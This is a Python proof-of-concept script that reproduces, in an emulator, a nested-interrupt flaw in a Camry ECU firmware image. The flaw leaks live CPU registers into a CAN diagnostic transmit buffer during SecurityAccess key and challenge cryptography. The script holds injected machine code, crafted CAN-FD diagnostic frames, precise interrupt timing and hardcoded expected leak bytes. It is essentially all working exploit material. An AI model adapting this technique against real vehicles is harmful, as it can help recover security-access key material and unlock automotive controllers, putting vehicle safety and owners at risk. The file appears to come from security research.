#!/usr/bin/env python3
"""Reproduce nested-interrupt live-register disclosure on exact Camry F33."""
from __future__ import annotations

import argparse
import hashlib
import json
import tempfile
from collections import Counter
from pathlib import Path
from typing import Any

from tools import REPO_ROOT
from tools.emulation.p1me_machine import capture_many

TARGET = "camry-8965F3307000"
IMAGE = REPO_ROOT / "firmware/camry-8965F3307000/CodeFlash.bin"
IMAGE_SHA256 = "42dce8efc42f6ae31718e7713fa2d26bb9191b4a82439778aee4d7afded9b0e7"
LOCAL_RAM = REPO_ROOT / "targets/camry-2026/raw-20260826/secoc-recovery/ram/local_ram_pe1.bin"
LOCAL_RAM_SHA256 = "0ddef478b15bcf3241c56573463eda25ba018081629daf0042fcae1204c435a7"
GLOBAL_RAM = REPO_ROOT / "targets/camry-2026/raw-20260826/secoc-recovery/ram/global_ram.bin"
GLOBAL_RAM_SHA256 = "53c8370237c681d4105c513be5096461ac735ffcb9577995c7203216165006a4"
DEFAULT_OUT = REPO_ROOT / "build/out/targets/camry-8965F3307000/nested-register-disclosure"
RETURN_STUB = 0x798
RING_PAYLOAD = 0xFEBE4618
LANDING = (0xFEBFF9F0, 0xFEBFFBFC)
CALL_SEQUENCER = bytes.fromhex(
    "26060010befe"  # mov 0xFEBE1000, r6
    "3f061400befe"  # mov 0xFEBE0014, lp
    "21061ad90800"  # mov 0x0008D91A, r1
    "6100"          # jmp r1
    "210698070000"  # mov 0x00000798, r1
    "6100"          # jmp r1
)
CAN_PAYLOAD = bytes(range(64))
CLIENT_MATERIAL = {
    "ascending": bytes(range(16)),
    "descending": bytes(range(0xFF, 0xEF, -1)),
}

# IRQ187 enters at each phase tick. IRQ134 is requested 58 retired instructions
# later, at 0x65B28 while the outer MPU-save frame still has SP lowered by 0x40.
# Expected tails are the exact original-CodeFlash result. Bytes 8..47 and 52..63
# map foreground r20..r11 and r9..r7; bytes 48..51 contain nested CTPSW.
PHASES: dict[str, dict[str, Any]] = {
    "challenge_encrypt_rounds": {
        "tick": 3000,
        "different_bytes": 29,
        "tails": {
            "ascending": "0000000000350200b0b3934f0041020010dff3cf5053a4eb0070cff9f868841f3c1e1e2227000000000000008c49bffe10000000aef74342",
            "descending": "0000000000350200245790760041020074562e226eee34bf30a9bc067439b6680c06060af3000000000000008c49bffe10000000e4797905",
        },
    },
    "decrypt_key_expansion": {
        "tick": 180,
        "different_bytes": 0,
        "tails": {
            "ascending": "000000003cdf69b94546c8a37999a11a1463075f990bc85e378b5fb100000000000000000000000000000000000000008c49bffe10000000",
            "descending": "000000003cdf69b94546c8a37999a11a1463075f990bc85e378b5fb100000000000000000000000000000000000000008c49bffe10000000",
        },
    },
    "decrypt_rounds": {
        "tick": 1100,
        "different_bytes": 20,
        "tails": {
            "ascending": "00000000004502004976cff5004d0200005102000775afe4641b4778cbe5f62a43725b14fdf176c0000000008c49bffe00000000dc1fbefe",
            "descending": "00000000004502004976cff5004d020000510200c8f1861a912b1348dea84dd7b22202e31949c9d8000000008c49bffe00000000dc1fbefe",
        },
    },
    "derived_key_expansion": {
        "tick": 2300,
        "different_bytes": 24,
        "tails": {
            "ascending": "00000000184002002f4d18a0417439adc6ddf10fe990e9afd50f4f634e0000005f00000027000000000000008c49bffe8c49bffe10000000",
            "descending": "00000000d83f02005eb25aa1410179bbb64a9817e8f8c2b665e0ca985200000081000000f3000000000000008c49bffe8c49bffe10000000",
        },
    },
}


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def memory_row(address: int, data: bytes, evidence: str) -> dict[str, Any]:
    return {"address": hex(address), "hex": data.hex(), "evidence": evidence}


def event_write(address: int, data: bytes, evidence: str) -> dict[str, Any]:
    return {
        "kind": "memory-write",
        "address": hex(address),
        "data_hex": data.hex(),
        "after_instructions": 0,
        "evidence": evidence,
    }


def scenario(phase: str, variant: str, local_ram: bytes) -> dict[str, Any]:
    phase_row = PHASES[phase]
    outer_tick = int(phase_row["tick"])
    tail = bytes.fromhex(phase_row["tails"][variant])
    expected_payload = CAN_PAYLOAD[:8] + tail
    return {
        "schema": "rh850-p1me-machine-scenario-v2",
        "name": f"nested_register_disclosure_{phase}_{variant}",
        "entry": {
            "role": "retained-original-software-state",
            "scope": "resolved-address",
            "address": "0xfebe0000",
        },
        "max_instructions": 4_000_000,
        "reset": "none",
        "gpr_fill": "0",
        "registers": {
            "sp": "0xfebe2000",
            "gp": "0xfebeb800",
            "tp": "0x23dfc",
            "lp": hex(RETURN_STUB),
            "PSW": "0",
            "PMR": "0",
            "RBASE": "0",
            "INTBP": "0x20200",
            "CTPC": "0",
            "CTPSW": "0",
            "ISPR": "0",
            "ICSR": "0",
            "INTCFG": "0",
            "EIWR": "0",
        },
        "stop_addresses": [hex(RETURN_STUB)],
        "artifacts": [
            {
                "path": str(LOCAL_RAM),
                "sha256": LOCAL_RAM_SHA256,
                "address": "0xfebe0000",
                "executable": False,
                "evidence": "Retained READY LocalRAM snapshot",
            },
            {
                "path": str(GLOBAL_RAM),
                "sha256": GLOBAL_RAM_SHA256,
                "address": "0xfeef8000",
                "executable": False,
                "evidence": "Paired post-handoff retained GlobalRAM snapshot",
            },
        ],
        "memory": [
            memory_row(0xFEBE0000, CALL_SEQUENCER, "Transparent SecurityAccess call sequencer"),
            memory_row(0xFFD20084, bytes.fromhex("2000ffff"), "Exact GCFG=0xFFFF0020 CMPOC setting"),
            memory_row(0xFFD20088, bytes(4), "RSCFD global operating mode"),
            memory_row(0xFFD20014, bytes(4), "RSCFD channel-1 operating mode"),
            memory_row(0xFFD20018, bytes(4), "RSCFD channel-1 normal status"),
            memory_row(0xFFD2012C, bytes.fromhex("03110000"), "Exact diagnostic CFIFO5 configuration 0x1103"),
        ],
        "events": [
            {
                "kind": "register-input",
                "register": "CFDTMSTS_CH1",
                "value": "0",
                "after_instructions": 0,
                "evidence": "Idle channel-1 local transmit resources",
            },
            {
                "kind": "register-input",
                "register": "TMIEC1",
                "value": "0xc0",
                "after_instructions": 0,
                "evidence": "Original CodeFlash channel-1 completion mask at 0x22EC0",
            },
            event_write(0xFEBE0000, CALL_SEQUENCER, "Restore the transparent call sequencer after loading retained RAM"),
            {
                "kind": "register-input",
                "register": "EIC187",
                "value": "0x48",
                "after_instructions": 0,
                "evidence": "Original startup EIC187 table-vector control",
            },
            {
                "kind": "register-input",
                "register": "EIC134",
                "value": "0x47",
                "after_instructions": 0,
                "evidence": "Original startup EIC134 table-vector priority-7 control",
            },
            event_write(0xFEBF4958, b"\x5a", "Activate the application SecurityAccess comparison path"),
            event_write(0xFEBF495A, bytes.fromhex("00112233445566778899aabbccddeeff"), "Fixed challenge"),
            event_write(0xFEBF497A, CLIENT_MATERIAL[variant], "Chosen client material for data-dependence control"),
            event_write(0xFEBE1000, bytes.fromhex("1032547698badcfeefcdab8967452301"), "Submitted key"),
            {
                "kind": "can-rx",
                "fifo": 5,
                "can_id": "0x7a1",
                "data_hex": CAN_PAYLOAD.hex(),
                "extended": False,
                "fd": True,
                "boundary": "post-filter",
                "label": 0x34,
                "after_instructions": outer_tick,
                "evidence": "Exact physical diagnostic route after rule-43 filtering; retained DLC64 with eight-byte CFIFO storage",
            },
            {
                "kind": "interrupt",
                "channel": 134,
                "firmware_control": "0x47",
                "after_instructions": outer_tick + 58,
                "evidence": "TAUJ0 CH1 preempts IRQ187 at 0x65B28 while the MPU-save frame remains lowered",
            },
        ],
        "expected_termination": "stop-address",
        "checks": [
            {
                "name": "both-interrupts-entered",
                "kind": "event-count",
                "operation": "interrupt-enter",
                "equals": 2,
            },
            {
                "name": "both-interrupts-returned",
                "kind": "event-count",
                "operation": "interrupt-return",
                "equals": 2,
            },
            {
                "name": "ring-payload",
                "kind": "memory",
                "address": hex(RING_PAYLOAD),
                "size": len(expected_payload),
                "equals_hex": expected_payload.hex(),
            },
            {
                "name": "landing-zone",
                "kind": "memory",
                "address": hex(LANDING[0]),
                "size": LANDING[1] - LANDING[0],
                "equals_hex": local_ram[LANDING[0] - 0xFEBE0000:LANDING[1] - 0xFEBE0000].hex(),
            },
        ],
    }


def check_report(report: dict[str, Any]) -> dict[str, Any]:
    failed = [row["name"] for row in report["checks"] if not row["passed"]]
    if report.get("termination_reason") != "stop-address" or report.get("fault") or failed:
        raise RuntimeError(
            f"{report['scenario']}: termination={report.get('termination_reason')} "
            f"fault={report.get('fault')} failed={failed}"
        )
    events = Counter(row["kind"] for row in report.get("device_events", []))
    ring = bytes.fromhex(next(row["actual"] for row in report["checks"] if row["name"] == "ring-payload"))
    return {
        "scenario": report["scenario"],
        "instruction_count": report.get("instruction_count"),
        "interrupt_enter": events["interrupt-enter"],
        "interrupt_return": events["interrupt-return"],
        "ring_tail": ring[8:].hex(),
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", type=Path, default=DEFAULT_OUT)
    args = parser.parse_args()
    out = args.out.resolve()

    identities = ((IMAGE, IMAGE_SHA256), (LOCAL_RAM, LOCAL_RAM_SHA256), (GLOBAL_RAM, GLOBAL_RAM_SHA256))
    for path, expected in identities:
        actual = sha256(path)
        if actual != expected:
            raise RuntimeError(f"artifact identity drift: {path}: {actual} != {expected}")

    local_ram = LOCAL_RAM.read_bytes()
    out.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="f33-nested-register-", dir=REPO_ROOT / "build/tmp") as tmp:
        tmp_path = Path(tmp)
        paths: list[Path] = []
        for phase in PHASES:
            for variant in CLIENT_MATERIAL:
                path = tmp_path / f"{phase}_{variant}.json"
                path.write_text(json.dumps(scenario(phase, variant, local_ram), indent=2) + "\n")
                paths.append(path)
        reports = capture_many(TARGET, paths, out / "reports")

    rows = [check_report(report) for report in reports]
    by_name = {row["scenario"]: row for row in rows}
    pair_differences: list[dict[str, Any]] = []
    for phase, phase_row in PHASES.items():
        ascending = bytes.fromhex(by_name[f"nested_register_disclosure_{phase}_ascending"]["ring_tail"])
        descending = bytes.fromhex(by_name[f"nested_register_disclosure_{phase}_descending"]["ring_tail"])
        offsets = [index + 8 for index, (left, right) in enumerate(zip(ascending, descending, strict=True)) if left != right]
        expected = int(phase_row["different_bytes"])
        if len(offsets) != expected:
            raise RuntimeError(f"{phase}: {len(offsets)} differing bytes != {expected}")
        pair_differences.append({"phase": phase, "different_bytes": len(offsets), "payload_offsets": offsets})

    summary = {
        "schema": "camry-f33-nested-register-disclosure-v1",
        "target": TARGET,
        "codeflash_sha256": IMAGE_SHA256,
        "ring_payload": hex(RING_PAYLOAD),
        "rows": rows,
        "pair_differences": pair_differences,
    }
    (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
